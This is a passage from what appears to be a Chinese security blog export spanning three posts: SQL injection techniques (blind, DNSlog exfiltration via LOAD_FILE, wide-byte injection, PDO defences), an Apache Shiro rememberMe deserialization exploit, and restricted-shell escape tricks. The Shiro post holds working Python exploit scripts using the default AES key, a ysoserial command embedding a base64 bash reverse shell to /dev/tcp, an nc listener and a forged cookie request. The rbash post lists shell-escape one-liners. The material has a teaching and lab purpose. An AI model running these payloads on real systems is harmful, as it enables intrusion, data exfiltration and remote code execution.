regexp&#39;^c&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.01 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |+-----------------------------------------------+| 0 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;+-----------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |+-----------------------------------------------+| 1 |+-----------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;+------------------------------------------------+| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |+------------------------------------------------+| 1 |+------------------------------------------------+1 row in set (0.00 sec) 123regexp &#39;^[a-z]&#39; #判断一个表的第一个字符串是否在a-z中regexp &#39;^r&#39; #判断第一个字符串是否为rregexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法) 提高盲注速度 DNSlog+盲注 https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html 原理： Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名www.test.com、t00ls.com.等的访问信息。 通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。 可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。 在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在ceye.io时，它会将这条域名信息转到相应的NS服务器上，而通过http://ceye.io我们就可以查询到这条DNS解析记录。 Microsoft SQL Server 123使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式： \\\\ComputerName\\SharedFolder\\Resource攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。 条件： 1、secure_file_priv为空 2、目标系统是windows，能够使用UNC路径 实例： 构造sql语句 1SELECT LOAD_FILE(CONCAT(&#39;\\\\\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\\\abc&#39;))) 四个\\，其中两个用来转义。DNSlog平台接受信息 宽字节注入造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。 GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。 比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。 应用程序的编码 以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启default_charset编码时，php的默认编码为空， 123; PHP&#39;s built-in default is text&#x2F;htmldefault_mimetype &#x3D; &quot;text&#x2F;html&quot;;default_charset &#x3D; &quot;iso-8859-1&quot; 此时php会根据数据库中的编码自动来确定使用那种编码，可以使用&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt; 来进行判断，如果输出的值是3说明是utf-8编码。如果输出的值是2说明是gbk编码； SET NAMES &#39;GBK&#39;语句与这三个语句等价： 123mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;; 三个语句的作用是： 当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。 当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。 使用addslashes函数或是开启PHPGPC（注：在php5.4已上已给删除，并且需要说明特别说明一点，GPC无法过滤$_SERVER提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子 123单引号（&#39;）&#x3D; （\\&#39;）双引号（&quot;） &#x3D; （\\&quot;）反斜杠（\\） &#x3D; （\\\\） 比如我们输入 1id&#x3D;%df%27 会被进行如下转换 %df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ 因为数据库设置了GBK编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是%df%5c转换成了汉字運，而单引号就逃逸了出来，从而造成了注入漏洞。 防御： 对于宽字节编码，有一种最好的修补就是： （1）使用mysql_set_charset(GBK)指定字符集 （2）使用mysql_real_escape_string进行转义 1原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。 （3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。 PDO技术mysql的预编译 当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。 模拟预处理 模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行 模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。 非模拟预处理 1234567891011121314PDO::ATTR_EMULATE_PREPARES =&gt; false&lt;?php$params = [ PDO::ATTR_ERRMODE =&gt; PDO::ERRMODE_EXCEPTION, PDO::ATTR_EMULATE_PREPARES =&gt; false,];$db = new PDO(&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;, &#x27;root&#x27;, &#x27;root&#x27;, $params);try &#123; $link = $db-&gt;prepare(&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;);&#125; catch (\\PDOException $e) &#123; var_dump($e);&#125; 可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程， 非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。 在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。 预编译可以完全杜绝注入攻击吗 在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。 总结 1231、使用PDO时尽量使用非模拟预处理。2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。3、SQL语句模板不使用变量动态拼接生成 关于orderby不能参数化查询的问题 原因： order by后面拼接字段名，字段名不能加引号。 在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。 insert、update注入利用报错注入12insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句 or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- 无回显注入(盲注) 利用xor、||、&amp;&amp;、+,-,*,/ 1234567mysql&gt; select (sleep(10));+-------------+| (sleep(10)) |+-------------+| 0 |+-------------+1 row in set (10.00 sec) 实例： 1234567891011121314151617mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.02 sec)mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.03 sec)mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.09 sec)mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (2.01 sec) 配合if、substr等函数进行盲注。 12345mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (0.01 sec)mysql&gt; insert into math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);Query OK, 1 row affected (10.00 sec) 有回显注入(符号) 实例： 按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。 这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#int型按位或mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from steady;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657374 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#int型按位异或mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected, 1 warning (0.03 sec)mysql&gt; select * from ctf;+----------+----------+-----------+------+| userid | username | signature | mood |+----------+----------+-----------+------+| 74657338 | 0 | test | 0 |+----------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(100^74657338);+---------------------+| unhex(100^74657338) |+---------------------+| test |+---------------------+1 row in set (0.00 sec)#字符型按位或mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.02 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657374 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(74657374);+-----------------+| unhex(74657374) |+-----------------+| test |+-----------------+1 row in set (0.00 sec)#字符型按位异或mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);Query OK, 1 row affected (0.03 sec)mysql&gt; select * from ctf;+--------+----------+-----------+------+| userid | username | signature | mood |+--------+----------+-----------+------+| 100 | 74657338 | test | 0 |+--------+----------+-----------+------+1 row in set (0.00 sec)mysql&gt; select unhex(&#39;100&#39;^74657338);+-----------------------+| unhex(&#39;100&#39;^74657338) |+-----------------------+| test |+-----------------------+1 row in set (0.00 sec) mysql运算符 按位或运算符–｜ 0与任意的数字b或都为b 1234567891011121314151617181920212223mysql&gt; mysql&gt; select (0|1);+-------+| (0|1) |+-------+| 1 |+-------+1 row in set (0.00 sec)mysql&gt; select (0|2323);+----------+| (0|2323) |+----------+| 2323 |+----------+1 row in set (0.01 sec)mysql&gt; select (0|452323);+------------+| (0|452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec) 按位异或运算符–^ 0与任意的数字b异或都是b 12345678910111213141516mysql&gt; select (0^452323);+------------+| (0^452323) |+------------+| 452323 |+------------+1 row in set (0.00 sec)mysql&gt; select (0^5644);+----------+| (0^5644) |+----------+| 5644 |+----------+1 row in set (0.00 sec) 其他数字a与任意数字b异或得到c 可以通过c与a异或得到b，通常b是我们sql注入想要的数据库 123456789101112131415mysql&gt; select (10^5644);+-----------+| (10^5644) |+-----------+| 5638 |+-----------+1 row in set (0.00 sec)mysql&gt; select (10^5638);+-----------+| (10^5638) |+-----------+| 5644 |+-----------+1 row in set (0.00 sec) 补充1、mysql的网站注入，5.0以上和5.0以下有什么区别？ MySQL 5.0以上版本， 5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。 5.0以下是多用户单操作，5.0以上是多用户多操做。","categories":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://s1eady.top/categories/SQL%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"Shiro安全","slug":"Apache_Shiro反序列化漏洞","date":"2020-03-27T05:32:30.000Z","updated":"2020-10-16T11:47:17.853Z","comments":true,"path":"2020/03/27/Apache_Shiro反序列化漏洞/","link":"","permalink":"http://s1eady.top/2020/03/27/Apache_Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"Shiro安全简介Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。 Shiro的功能 验证用户身份 用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限 在非 Web 或 EJB 容器的环境下可以任意使用Session API 可以响应认证、访问控制，或者 Session 生命周期中发生的事件 可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图) 支持单点登录(SSO)功能 支持提供“Remember Me”服务，获取用户关联信息而无需登录 Apache Shiro 反序列化漏洞实战漏洞原理Apache Shiro框架提供了记住我的功能（RememberMe），用户登陆成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过对相关信息进行序列化，然后使用aes加密，最后在使用base64编码处理形成的。实际上漏洞与shiro版本无关, 无论是否升级shiro到1.2.5及以上, 如果shiro的rememberMe功能的AES密钥被泄露, 就会导致反序列化漏洞。 RememberMe1、检索RememberMe cookie 的值2、Base 64解码3、使用AES解密(加密密钥硬编码)4、进行反序列化操作（未作过滤处理） 在调用反序列化时未进行任何过滤，导致可以触发远程代码执行漏洞。 用户登录凭证的生成，加密顺序： Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 加密后的remember Me内容 在识别用户身份的时候，需要对remember Me的字段进行解密，解密的顺序为： remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化。 漏洞利用由于使用来aes加密，要想成功利用漏洞则需要获取aes的加密密钥，而在shiro的1.2.4之前版本中使用的是硬编码。其默认密钥的base64编码后的值为kPH+bIxk5D2deZiIxcaaaA==。这里就可以通过构造恶意的序列化对象进行编码，加密，然后作为cookie加密发送，服务端接收后会解密并触发反序列化漏洞。 1、AES加密是硬编码。 2、反序列化没有做任何过滤，外界传递什么值就反序列化什么值。 漏洞特征如果登录页面有记住我的功能，登录页面的cookie中存在remeberMe=deleteMe的内容。 使用burp测试 输入密码之后返回包中看到敏感字段 直接浏览器查看请求 fofa、shodan、zoomeye 1header&#x3D;&quot;rememberme&#x3D;deleteMe&quot;、header&#x3D;&quot;shiroCookie&quot; ysoserialysoserial是一款目前最流行的Java反序列化Payload生成工具，目前支持29种的Payload生成。本地通过JRMPClient的payload链接服务器上的JRMP服务使用网上的漏洞利用工具发送即可利用成功。 RMI简介Java远程方法调用，即Java RMI（Java Remote Method Invocation）是Java编程语言里，一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 RMI的序列化和反序列化在RMI的通信过程中，用到了很多的序列化和反序列化，而在Java中，只要进行反序列化操作就可能有漏洞。RMI通过序列化传输Remote对象，那么我们可以构造恶意的Remote对象，当服务端反序列化传输过来的数据时，就会触发反序列化。 EXP12345678910111213141516171819202122232425262728293031# coding:utf-8from Crypto.Cipher import AESimport tracebackimport requestsimport subprocessimport uuidimport base64import systarget = &quot;http://127.0.0.1:8080/doLogin&quot;jar_file = &#x27;/Users/apple/Documents/steady-sec/shiro/ysoserial.jar&#x27;cipher_key = &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;# 创建 rememberme的值popen = subprocess.Popen([&#x27;java&#x27;,&#x27;-jar&#x27;,jar_file, &quot;URLDNS&quot;, &quot;http://95d950.dnslog.cn&quot;], stdout=subprocess.PIPE)BS = AES.block_sizepad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()mode = AES.MODE_CBCiv = uuid.uuid4().bytesencryptor = AES.new(base64.b64decode(cipher_key), mode, iv)file_body = pad(popen.stdout.read())base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))# 发送requesttry: r = requests.get(target, cookies=&#123;&#x27;rememberMe&#x27;:base64_ciphertext.decode()&#125;, timeout=30) print(r.status_code)except: traceback.print_exc() 195d950.dnslog.cn 112.25.12.136 2020-10-10 10:07:12 POC检查key 1python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 12345678910111213try CipherKey :5aaC5qKm5oqA5pyvAAAAAA&#x3D;&#x3D;generator payload done.send payload ok.checking.....checking.....checking.....checking.....try CipherKey :kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;generator payload done.send payload ok.checking.....vulnerable:True url:http:&#x2F;&#x2F;127.0.0.1:8080 CipherKey:kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 检查gadget 1python shiro_exploit.py -u http:&#x2F;&#x2F;127.0.0.1:8080 -t 3 -p &quot;ping -c 2 http:&#x2F;&#x2F;ax18gp.dnslog.cn&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot; 监听本地端口 1nc -lvp 1234 通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令。 Java base64编码http://www.jackson-t.ca/runtime-exec-payloads.html。 1java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; CommonsCollections4、CommonsCollections2、CommonsCollections5都可以试试。 使用shiro.py 生成Payload 12➜ shiro python shiro_poc_rember.py 127.0.0.1:6666rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D; 1234567891011121314151617181920import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen &#x3D; subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;&#x2F;Users&#x2F;apple&#x2F;Documents&#x2F;steady-sec&#x2F;shiro&#x2F;ysoserial.jar&#39;, &#39;JRMPClient&#39;, command], stdout&#x3D;subprocess.PIPE) BS &#x3D; AES.block_size pad &#x3D; lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key &#x3D; base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;) iv &#x3D; uuid.uuid4().bytes encryptor &#x3D; AES.new(key, AES.MODE_CBC, iv) file_body &#x3D; pad(popen.stdout.read()) base64_ciphertext &#x3D; base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ &#x3D;&#x3D; &#39;__main__&#39;: payload &#x3D; encode_rememberme(sys.argv[1]) print &quot;rememberMe&#x3D;&#123;0&#125;&quot;.format(payload.decode()) 构造数据包，伪造cookie，发送Payload. 123456789101112131415POST &#x2F;doLogin HTTP&#x2F;1.1Host: 127.0.0.1:8080User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko&#x2F;20100101 Firefox&#x2F;81.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 53Origin: http:&#x2F;&#x2F;127.0.0.1:8080Connection: closeReferer: http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login;jsessionid&#x3D;65E88136CDB707384CB4A4C27659B658Cookie: JSESSIONID&#x3D;65E88136CDB707384CB4A4C27659B658;rememberMe&#x3D;7sf6Aww8S9KEd7uQj2cX60H5BuTt8lt4IoELDzh2pXjkZENeSYWA7WNywqixdac4AY&#x2F;gNom7n+T0AfMgWvjob0njwuaOy4J3tl85oO0uUI+PUQ7IP9w3WYBtn50rRlIkckOfE8e64ps0528OCA6rSU2BkPbOvjpHgAPx8vzopDSGO85t03fBpX8nwzgR8QQyJ&#x2F;R&#x2F;6O7W85RTTxLyGLy9mYwoxYlHScecW&#x2F;jg&#x2F;fgDczxWIooKVKJPLiuCGozp7VddvPmUxrXV5YkzdYCTSXl6087aqul1yAbp0s1bGhVDLCdnwAeZgstLJFKrm2RauJEiM5gz5tkjlBmDZbWqXepaAybgFOgX2ya8xTFM5gN7XIgx8l8Mq2AtvC5gbg3oS1xtofOErw1Xx3kFEdow8AcvzQ&#x3D;&#x3D;Upgrade-Insecure-Requests: 1username&#x3D;admin&amp;password&#x3D;vulhub&amp;rememberme&#x3D;remember-me","categories":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/categories/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"组件安全","slug":"组件安全","permalink":"http://s1eady.top/tags/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/"}]},{"title":"rbash绕过","slug":"rbash绕过","date":"2019-06-22T01:20:56.000Z","updated":"2020-10-09T11:29:45.535Z","comments":true,"path":"2019/06/22/rbash绕过/","link":"","permalink":"http://s1eady.top/2019/06/22/rbash%E7%BB%95%E8%BF%87/","excerpt":"","text":"Rbash绕过什么是受限shell环境?受限shell环境，指的是一个会阻止/限制某些命令（如cd、ls、echo等）或”阻止”SHELL、PATH、USER等环境变量的shell环境。有些时候，受限shell环境可能会阻止重定向输出操作符如&gt;，&gt;&gt;，或者其他使用这些重定向的命令。 受限shell环境的目的 提高安全性 防止受到黑客/渗透测试人员的攻击。 有时，系统管理员会创建一个受限shell环境，来防止受到某些危险命令误操作所带来的伤害。 信息收集拿到一个受限制的shell之后，我们需要做的就是执行一些操作，来摸清当前shell的限制情况。 查看是否可以执行某些命令 1cd、ls、echo 检查操作符号 1&gt;、&gt;&gt;、&lt;、| 检查编程语言是否可以运行 1perl、ruby、python、php 查看我们能以root用户运行那些命令 1sudo -l 12345678910➜ ~ sudo -lPassword:Matching Defaults entries for apple on appledeMacBook-Pro: env_reset, env_keep+=BLOCKSIZE, env_keep+=&quot;COLORFGBG COLORTERM&quot;, env_keep+=__CF_USER_TEXT_ENCODING, env_keep+=&quot;CHARSET LANG LANGUAGE LC_ALL LC_COLLATE LC_CTYPE&quot;, env_keep+=&quot;LC_MESSAGES LC_MONETARY LC_NUMERIC LC_TIME&quot;, env_keep+=&quot;LINES COLUMNS&quot;, env_keep+=LSCOLORS, env_keep+=SSH_AUTH_SOCK, env_keep+=TZ, env_keep+=&quot;DISPLAY XAUTHORIZATION XAUTHORITY&quot;, env_keep+=&quot;EDITOR VISUAL&quot;, env_keep+=&quot;HOME MAIL&quot;, lecture_file=/etc/sudo_lectureUser apple may run the following commands on appledeMacBook-Pro: (ALL) ALL 检查具有SUID权限的文件或命令 检查当前所用的shell，具体命令为：echo $SHELL 。 12➜ blog echo $SHELL/bin/zsh 查看当前的环境变量 env或printenv命令 12345678➜ blog envTERM_SESSION_ID&#x3D;w1t0p0:A0B301BE-DD25-4605-BC9B-7B6F99E2BF38SSH_AUTH_SOCK&#x3D;&#x2F;private&#x2F;tmp&#x2F;com.apple.launchd.zvhBmnseo7&#x2F;ListenersLC_TERMINAL_VERSION&#x3D;3.3.9COLORFGBG&#x3D;15;0ITERM_PROFILE&#x3D;DefaultXPC_FLAGS&#x3D;0x0LANG&#x3D;zh_CN.UTF-8 绕过rbash编程语言绕过1234561) 使用 except &gt; except spawn sh，然后执行sh2) 使用 python &gt; python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;3) 使用 php &gt; php -a ，然后执行 exec(&quot;sh -i&quot;);4) 使用 perl &gt; perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;5) 使用 lua &gt; os.execute(&#39;&#x2F;bin&#x2F;sh&#39;).6) 使用 ruby &gt; exec &quot;&#x2F;bin&#x2F;sh&quot; 常见绕过技术1231）如果允许使用“&#x2F;”的话，则可以运行&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash。2）如果可以运行cp命令，则可以将&#x2F;bin&#x2F;sh或&#x2F;bin&#x2F;bash复制到自己的目录中。3) 使用 ftp &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 12345678910111213144) 使用 gdb &gt; !/bin/sh 或者 !/bin/bash[steady@gongxinao ~]$ gdbGNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-119.el7Copyright (C) 2013 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-redhat-linux-gnu&quot;.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.(gdb) !/bin/shsh-4.2$ 12345675) 使用 more&#x2F;man&#x2F;less &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bashless 和 more阅读页面时候，也会进入命令模式，键入q则会直接退出，如果键入 !&#39;sh&#39; 则会进入一个shell。6) 使用 vim &gt; !&#x2F;bin&#x2F;sh 或者 !&#x2F;bin&#x2F;bash 或者 set shell&#x3D;&#x2F;bin&#x2F;bash shellvi steady.txt 方法vi进入编辑器命令模式:!&#x2F;bin&#x2F;bash 输入&#x2F;bin&#x2F;bash7) 使用 rvim &gt; :python import os; os.system(&quot;&#x2F;bin&#x2F;bash )8) 使用 scp &gt; scp -S &#x2F;path&#x2F;yourscript x y: 12349) 使用 awk &gt; awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash&quot;)&#125;&#39;[steady@gongxinao ~]$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;sh-4.2$ awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;[steady@gongxinao ~]$ 110) 使用 find &gt; find &#x2F; -name test -exec &#x2F;bin&#x2F;sh 或者 &#x2F;bin&#x2F;bash \\; 其他技术12341)使用 ssh &gt; ssh username@IP - t &quot;&#x2F;bin&#x2F;sh&quot; 或者 &quot;&#x2F;bin&#x2F;bash&quot;2)使用 ssh2 &gt; ssh username@IP -t &quot;bash --noprofile&quot;3)使用 ssh3 &gt; ssh username@IP -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot; (shellshock)通过ssh链接当前IP的当前用户并启动&#x2F;bin&#x2F;bash，主要用到了ssh命令的t参数。 123454)使用 ssh4 &gt; ssh -o ProxyCommand&#x3D;&quot;sh -c &#x2F;tmp&#x2F;yourfile.sh&quot; 127.0.0.1 (SUID)5)使用 git &gt; git help status &gt; ，然后就可以运行 !&#x2F;bin&#x2F;bash了6)使用 pico &gt; pico -s &quot;&#x2F;bin&#x2F;bash&quot; ，然后就可以对 &#x2F;bin&#x2F;bash 执行写操作，最后执行 CTRL + T7)使用 zip &gt; zip &#x2F;tmp&#x2F;test.zip &#x2F;tmp&#x2F;test -T --unzip-command&#x3D;&quot;sh -c&#x2F;bin&#x2F;bash&quot;8)使用 tar &gt; tar cf &#x2F;dev&#x2F;null testfile --checkpoint&#x3D;1 --checkpointaction&#x3D;exec&#x3D;&#x2F;bin&#x2F;bash 设置环境变量查看当前用户是否对环境变量有写的权限。如果有w权限我们就可以修改。 12345declare -x PATH=&quot;/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/steady/.local/bin:/home/steady/bin&quot;declare -x PWD=&quot;/home/steady&quot;declare -x QT_IM_MODULE=&quot;ibus&quot;declare -x SESSION_MANAGER=&quot;local/unix:@/tmp/.ICE-unix/1942,unix/unix:/tmp/.ICE-unix/1942&quot;declare -x SHELL=&quot;/bin/bash&quot; 如果具有写入的权限，呢么我们可以把/bin/bash添加到环境变量$PATH中。$PATH是一个Linux的环境变量，用于命令搜索。 /bin是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod 